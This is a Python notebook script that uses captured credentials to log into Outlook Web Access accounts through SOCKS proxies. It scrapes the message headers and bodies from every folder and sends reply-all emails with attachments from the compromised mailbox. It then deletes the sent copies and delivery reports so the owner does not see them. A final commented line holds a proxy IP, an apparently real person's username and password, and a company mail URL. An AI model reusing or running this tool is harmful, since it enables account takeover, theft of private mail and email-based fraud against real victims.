#!/usr/bin/env python
# coding: utf-8

# In[1]:


from pyvirtualdisplay import Display
import urllib.request
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.chrome.options import Options
import re
import requests
import socks
import socket
from urllib.parse import urlparse
import asyncio
from concurrent.futures import ThreadPoolExecutor
from timeit import default_timer
import os
import nest_asyncio
from bs4 import BeautifulSoup as soup

#important shit for async funcs
nest_asyncio.apply()
display = Display(visible=0, size=(1440, 900))
display.start()




class WebMailClass():

    def __init__(self,socks_address,socks_port):
        self.socks_address=socks_address
        self.socks_port=socks_port



    #method to parse logs data
    #firstly we check str to contain creds (OWA fields - username/password)
    #then using socks analyze login page content
    #if all okay => True
    #and we can try to log in via grabber method
    def LogsParser(self, logs_data, logs_url):

        try:
            mail_username = urllib.parse.unquote(re.search('&username=(.*?)&', logs_data+'&').group(1))
            mail_password = urllib.parse.unquote(re.search('&password=(.*?)&', logs_data+'&').group(1))
            text = requests.get(logs_url,
                    proxies=dict(http=f'socks5://{self.socks_address}:{self.socks_port}',
                                 https=f'socks5://{self.socks_address}:{self.socks_port}')).text.lower()
            #print(mail_username,mail_password,text)
            if len(mail_username)>0            and len(mail_password)>0            and len(re.findall('outlook',text))>0:
                return True,mail_username,mail_password
            else:
                return False, None, None
        except Exception as e:
            print(e)

    #this method returns firefox web driver for job methods (grabber,sender)

    def StartSession(self, webmail_login, webmail_password, webmail_url,grabber_mode):
        #display = Display(visible=0, size=(800, 600))
        #display.start()
        #set up firefox settings - profile and proxy
        url_parsed = webmail_url
        #urlparse(webmail_url).scheme+'://'+urlparse(webmail_url).netloc
        #options = webdriver.ChromeOptions()
        #proxy = f'{self.socks_address}:{self.socks_port}'
        #options.add_argument('--no-sandbox')
        #options.add_argument('--proxy-server=socks5://' + proxy)
        #options.add_argument("--incognito")
        #driver = webdriver.Chrome(options=options)
        profile = webdriver.FirefoxProfile()
        profile.set_preference("network.proxy.type", 1)
        profile.set_preference("network.proxy.socks", self.socks_address)
        profile.set_preference("network.proxy.socks_port", self.socks_port)
        profile.set_preference("network.proxy.socks_version", 5)
        profile.update_preferences()

        #start browsing and open url
        driver = webdriver.Firefox(firefox_profile=profile)
        timeout=30
        driver.get(url_parsed)
        time.sleep(5)
        try:
            element_present = EC.presence_of_element_located((By.NAME, 'username'))
            WebDriverWait(driver, timeout).until(element_present)
        except TimeoutException:
            print("Timed out waiting for page to load")

        #time.sleep(5)
        #print(driver.page_source)
        #input usrnm and pswrd and login and submit em

        username = driver.find_element_by_name("username")
        password = driver.find_element_by_name("password")
        driver.get_screenshot_as_file('index.png')
        username.send_keys(webmail_login)
        password.send_keys(webmail_password)
        if len(driver.find_elements_by_id('chkBsc'))==0:
            raise Exception('Incorrent Outlook Version')
        if grabber_mode==True:
            driver.find_element_by_id('chkBsc').click()

        try:
            driver.find_element_by_class_name('btn').click()
        except:
            driver.find_element_by_class_name('signinbutton').click()

        if len(re.findall('reason=2',driver.current_url))>0:
            raise Exception('Incorrent username or password')
        print('Session started')
        if grabber_mode==True and  len([x for x in driver.find_elements_by_xpath('//*[@id="lnkBrwsAllFldrs"]') if x.is_displayed()])>0:
            print('This is light version, changing options and relogin has been started...')
            driver.get_screenshot_as_file('loaded.png')
            driver.get(driver.current_url+'?ae=Options&t=General')
            driver.find_element_by_id('chkOptAcc').click()
            driver.get_screenshot_as_file('options.png')
            driver.find_element_by_id('lnkHdrsave').click()
            driver.find_element_by_id('lo').click()
            driver.get(url_parsed)
            try:
                element_present = EC.presence_of_element_located((By.NAME, 'username'))
                WebDriverWait(driver, timeout).until(element_present)
            except TimeoutException:
                print("Timed out waiting for page to load")

            username = driver.find_element_by_name("username")
            password = driver.find_element_by_name("password")
            username.send_keys(webmail_login)
            password.send_keys(webmail_password)
            driver.find_element_by_class_name('btn').click()
        return driver

    def fetch(self,session, urls):

        with session.get(urls['header']) as response_header:
            data_header = response_header.text
            page_soup = soup(data_header, "html.parser")
            text_header = page_soup.find("textarea").getText()
        with session.get(urls['body']) as response_body:
            data_body = response_body.text
            page_soup = soup(data_body, "html.parser")
            body_html = page_soup.find("div", {"class": "bdy"})
            #print(data_body)

        self.hdrs.append({'id':urls['id']
                          ,'header':text_header
                          ,'body':body_html})

    #funcs makes async fetch func apply

    async def get_data_asynchronous(self,norm_session, urls_headers):
        with ThreadPoolExecutor(max_workers=20) as executor:
            with norm_session as session:
                # Set any session parameters here before calling `fetch`
                loop = asyncio.get_event_loop()

                tasks = [
                    loop.run_in_executor(
                        executor,
                        self.fetch,
                        *(session, url_header) # Allows us to pass in multiple arguments to `fetch`
                    )
                    for url_header in urls_headers
                ]
                for response in await asyncio.gather(*tasks):
                    pass

    def WebMailGrabber(self, driver):
        self.hdrs=[]
        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass
        try:
            driver.find_elements_by_xpath('//*[@id="lnkBrwsAllFldrs"]')[0].click()
        except:
            pass
        url_get_header_params={'?oeh':1
                   ,'ns':'ReadMessage'
                   ,'ev':'LMD'
                   }

        url_to_request_headers=driver.current_url.split(f'/owa')[0]+'/owa/ev.owa'
        cooks=driver.get_cookies()
        session_to_work = requests.Session()

        for cookie in cooks:
            session_to_work.cookies.set(cookie['name'], cookie['value'])
        for el in cooks:
            if el['name']=='UserContext':
                url_get_header_params.update({'canary':el['value']})


        folders_ids=[]
        global_letters_ids=[]
        folders_list=driver.find_elements_by_id('selbrfld')[0]
        for folder_element in folders_list.find_elements_by_xpath(".//*"):
            attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', folder_element)
            f_nm=attrs['title']
            f_id=attrs['value']
            folders_ids.append({f_nm:f_id})

        for folder_id in folders_ids:
            #print(list(folder_id.values())[0])
            driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={list(folder_id.values())[0]}"))
            pages=1
            if len(driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a'))>0:
                f=driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a')
                attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', f[0])
                page=attrs['onclick']
                pages=int(re.search("('(.*?)')",page).group(1).replace("'",""))


            for page_num in range(1,pages+1):
                print(f'Start parse {page_num} page..')
                this_pages_id=[]
                urls_ready_to_request=[]

                driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={list(folder_id.values())[0]}")+f"&pg={page_num}")
                time.sleep(2)
                for chkbox in driver.find_elements_by_xpath("//input[@type='checkbox']")[1:]:
                    attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', chkbox)
                    id_letter=attrs['value']
                    if id_letter not in global_letters_ids:
                        global_letters_ids.append(id_letter)
                        id_transformed=re.sub('/', '%252f', id_letter)
                        id_transformed=id_transformed.replace("+","%252b")
                        url_get_header_params.update({'Id':'id%3d'+id_transformed})
                        #print(url_get_header_params)
                        st_=''
                        for key,val in url_get_header_params.items():
                            st_+=str(key)+'='+str(val)+'&'
                        get_query_url=str(url_to_request_headers+st_).strip('&')
                        id_transformed_1=re.sub('/', '%2f', id_letter)
                        id_transformed_1=id_transformed_1.replace("+","%2b")
                        get_query_url_body=driver.current_url.split(f'/owa')[0]+'/owa/'+"?ae=Item&t=IPM.Note&id="+id_transformed_1
                        urls_ready_to_request.append({'id':id_letter
                                                        ,'header':get_query_url
                                                        ,'body':get_query_url_body})
                        #print(get_query_url,get_query_url_body)

                #make async funcs and start it
            loop = asyncio.get_event_loop()
            future = asyncio.ensure_future(self.get_data_asynchronous(session_to_work,urls_ready_to_request))
            loop.run_until_complete(future)
        return self.hdrs

    #disable conversation view - cause it obscures scrapping

    def view_conversation_disabler(self,driver):
        try:
            [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='View'][0].click()
            time.sleep(1)
            conv_opt=driver.find_elements_by_id('useConversations')[0]
            if len([x for x in conv_opt.find_elements_by_id('imgChk') if x.is_displayed()])>0:
                [x for x in conv_opt.find_elements_by_id('imgChk') if x.is_displayed()][0].click()
                time.sleep(3)
            [x for x in driver.find_elements_by_id('imgLiveLogo') if x.is_displayed()][0].click()

        except:
            pass

    def alerts_closer(self,driver):
        try:
            [x for x in driver.find_elements_by_id('imgLiveLogo') if x.is_displayed()][0].click()
        except:
            pass
        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass

        try:
            dialogs=driver.find_elements_by_class_name('btnDlg')
            for dialog in dialogs:
                try:
                    dialog.find_elements_by_id('imgX')[0].click()
                except Exception as e:
                    pass
            while len([x for x in driver.find_elements_by_id('divBtnSnooze') if x.is_displayed()])>0:
                driver.find_element_by_id('divBtnSnooze').click()
        except:pass

    #send email method

    def SendEmail(self,driver, letter_id,answer_body,report_flag,remove_sent_flag,attachment):
        #open new window, define windows and get preform to reply all mode
        base_url=driver.current_url
        driver.execute_script("window.open()")
        time.sleep(3)
        id_quoted=urllib.parse.quote(letter_id, safe='')
        main_window=driver.window_handles[0]
        sending_windows=driver.window_handles[1]
        driver.switch_to.window(sending_windows)
        driver.get(f'{base_url}?ae=PreFormAction&a=ReplyAll&t=IPM.Note&id={id_quoted}')
        print(f'{base_url}?ae=PreFormAction&a=ReplyAll&t=IPM.Note&id={id_quoted}')
        #print(driver.page_source)
        time.sleep(2)
        try:
            alert = driver.switch_to.alert
            alert.dismiss()
            time.sleep(0.5)
        except:
            pass

        #switch to textarea iframe and place preprocessed answer plaintext or html
        frame = driver.find_element_by_tag_name("iframe")
        driver.switch_to.frame(frame)
        time.sleep(1)
        br=driver.find_elements_by_tag_name('br')[0]
        driver.execute_script(f"arguments[0].outerHTML= '{answer_body}';",br)
        time.sleep(1)
        print('Body pasted')
        #fix subject for next operations
        driver.switch_to.default_content()
        time.sleep(1)
        sub_el=driver.find_element_by_id('txtSubj')
        attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', sub_el)
        subj=attrs['value']
        subj_n=''.join([x for x in subj.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])


        #add attachment
        if attachment!=False:
            #click to call attachment procedure
            driver.find_elements_by_id('divToolbarButtonattachfile')[0].click()
            #recursively switch to work frame
            frame = None
            while frame is None:
                try:
                    frame = driver.find_elements_by_id('iFrameModalDlg')[0]
                except:
                    self.alerts_closer(driver)
                    pass
            driver.switch_to.frame(frame)
            frame = None
            while frame is None:
                try:
                    frame = driver.find_elements_by_tag_name('iframe')[0]
                except:
                    self.alerts_closer(driver)
                    pass
            driver.switch_to.frame(frame)
            #input path to file
            [x for x in driver.find_elements_by_tag_name("input") if x.is_displayed()][0].send_keys(attachment)
            driver.find_elements_by_id('btnAttch')[0].click()
            time.sleep(3)
            driver.switch_to.default_content()

            print('File attached')

        if report_flag==True:
            time.sleep(1)
            #if you need report place the flag in the option
            options = None
            while options is None:
                try:
                    options = [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Options...' and x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            for i in range(50):
                try:
                    options.click()
                except:
                    pass
            print('Options clicked')
            driver.get_screenshot_as_file('options.png')
            checkbox = None
            while checkbox is None:
                try:

                    checkbox = [x for x in driver.find_elements_by_id("chkDvRcp") if x.is_displayed()][0]

                except:

                    self.alerts_closer(driver)
                    pass
            time.sleep(1)

            checkbox.click()
            print('checkbox clicked')
            time.sleep(1)
            checkbox = None
            while checkbox is None:
                try:
                    checkbox = [x for x in driver.find_elements_by_id('btn0') if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            checkbox.click()
            print('Report requested')
            time.sleep(2)

        for i in range(50):
            driver.find_elements_by_id('divTo')[0].send_keys(Keys.BACKSPACE)
        driver.find_elements_by_id('divTo')[0].send_keys("e1236758@urhen.com")
        print('EMail changed')
        #find the send button and click on it
        send_button=None
        while send_button is None:
            try:
                send_button = [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Send' and x.is_displayed()][0]
            except Exception as e:
                self.alerts_closer(driver)
                pass

        for i in range(20):
            try:
                [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Send' and x.is_displayed()][0].click()
            except Exception as e:
                #print(e)
                pass
        print('Sent')
        time.sleep(3)
        driver.switch_to.window(main_window)
        time.sleep(3)
        #driver.get_screenshot_as_file('switch.png')
        print('Switched')
        if report_flag==True:
            time.sleep(10)
            reports=[]
            for i in range(10):
                self.alerts_closer(driver)
            #move to inbox
            breadcrumbs = None
            while breadcrumbs is None:
                try:

                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    #self.alerts_closer(driver)
                    pass

            #check current folder and move to 'Inbox' folder
            current_folder=None

            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass

            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Inbox':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Inbox' and x.is_displayed()][0].click()
                    time.sleep(3)
                except:
                    self.alerts_closer(driver)
                    pass
            print('Moved to Inbox')
            try:
                self.view_conversation_disabler(driver)
                time.sleep(3)
            except:
                self.alerts_closer(driver)
                pass
            #wait untill letters load
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                    self.alerts_closer(driver)
                    pass
            try:
                for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]:
                    try:
                        element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                        #print(element_text,'------',subj_n)
                        if len(re.findall(subj_n,element_text))>0:
                            element.click()
                            self.alerts_closer(driver)
                            time.sleep(1)
                            frame = driver.find_element_by_id('ifBdy')
                            driver.switch_to.frame(frame)
                            report=driver.find_element_by_xpath('/html/body').get_attribute('outerHTML')
                            reports.append(report)
                            driver.switch_to.default_content()
                            [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                            print('Deleted from Inbox')
                    except Exception as e:
                        self.alerts_closer(driver)
                        #print(e)
            except Exception as e:
                self.alerts_closer(driver)
                #print(e)
            #find the reports via subject, write it and delete

            #move to deleted and permanent delete reports
            #move to Deleted Items and Delet em all
            breadcrumbs = None
            while breadcrumbs is None:
                try:
                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            current_folder=None
            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Deleted Items':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Deleted Items' and x.is_displayed()][0].click()
                    time.sleep(5)
                    print('Moved to Deleted')
                except:
                    self.alerts_closer(driver)
                    pass
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                     pass
            for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]') if x.is_displayed()]:
                self.alerts_closer(driver)
                try:
                    element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                    attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', element)
                    if len(re.findall(subj_n,element_text))>0:
                        element.click()
                        [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                        alert = driver.switch_to.alert
                        alert.accept()
                        print('Deleted from deleted items')
                except:
                    self.alerts_closer(driver)
                    continue

        ################################################
        #similar way delete from sent items if you need#
        ################################################
        if remove_sent_flag==True:

            #wait for breadcrumbs element to define it
            breadcrumbs = None
            while breadcrumbs is None:
                try:

                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    #self.alerts_closer(driver)
                    pass

            #check current folder and move to 'Sent Items' folder
            current_folder=None

            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass

            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Sent Items':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Sent Items' and x.is_displayed()][0].click()
                    time.sleep(5)
                    print('Moved to Sent Items')
                except:
                    self.alerts_closer(driver)
                    pass

            time.sleep(1)
            try:
                self.view_conversation_disabler(driver)
                time.sleep(3)
            except:
                self.alerts_closer(driver)
                pass
            #wait untill letters load
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                    self.alerts_closer(driver)
                    pass
            try:
                for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]:
                    try:
                        element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                        if len(re.findall(subj_n,element_text))>0:
                            element.click()
                            time.sleep(1)
                            [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                            print('Deleted from Sent Items')
                    except Exception as e:
                        self.alerts_closer(driver)
                        #print(e)
            except Exception as e:
                self.alerts_closer(driver)
                #print(e)

            try:
                self.alerts_closer(driver)
            except:
                pass
            #move to Deleted Items and Delet em all
            breadcrumbs = None
            while breadcrumbs is None:
                try:
                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            current_folder=None
            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Deleted Items':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Deleted Items' and x.is_displayed()][0].click()
                    time.sleep(5)
                    print('Moved to Deleted Items')
                except:
                    self.alerts_closer(driver)
                    pass
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                     pass
            for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]') if x.is_displayed()]:
                self.alerts_closer(driver)
                try:
                    element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                    attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', element)
                    if len(re.findall(subj_n,element_text))>0:
                        element.click()
                        [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                        alert = driver.switch_to.alert
                        alert.accept()
                        print('Deleted from Deleted Items')
                except:
                    self.alerts_closer(driver)
                    continue

            if report_flag==True:
                return reports


# In[ ]:




#session=WebMailClass('142.234.157.99',38200).StartSession('irene.forlenza', 'irene', 'https://mail.pintoconstruction.com/owa/auth.owa' ,True)
